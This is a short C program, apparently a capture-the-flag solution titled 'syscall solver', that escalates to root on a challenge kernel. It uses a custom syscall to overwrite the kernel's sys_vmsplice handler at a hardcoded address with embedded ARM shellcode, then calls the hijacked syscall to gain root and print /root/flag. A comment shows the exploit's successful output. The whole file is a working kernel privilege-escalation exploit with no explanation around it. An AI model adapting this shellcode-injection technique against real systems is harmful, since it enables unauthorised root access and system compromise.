//syscall solver
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
 
#define SYS_UPPER 223
#define OVERWRITTEN 343
 
/* exploit output: 
[+] Overwriting sys_vmsplice...
[+] Got r00t
[+] Flag: Congratz!! addr_limit looks quite IMPORTANT now... huh?
*/
 
int main()
{
    char flag[128];
    char grant_privs[] = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a"
                         "\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32"
                         "\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80";
 
    printf("[+] Overwriting sys_vmsplice...\n");
    void * sys_vmsplice = (void *)0x800e3dc8;
 
    syscall(SYS_UPPER, grant_privs, sys_vmsplice);
    syscall(OVERWRITTEN);
 
    if(getuid()){
        perror("[-] Something went wrong\n");
        return -1;
    }
 
    printf("[+] Got r00t\n");
    FILE * fp = fopen("/root/flag","r");
  
    if( fp == NULL )
    {
       perror("[-] Error while opening the flag file\n");
       return -1;
    }
 
    fgets(flag, 128, fp);
    printf("[+] Flag: %s", flag);
  
    fclose(fp);
    return 0;
}
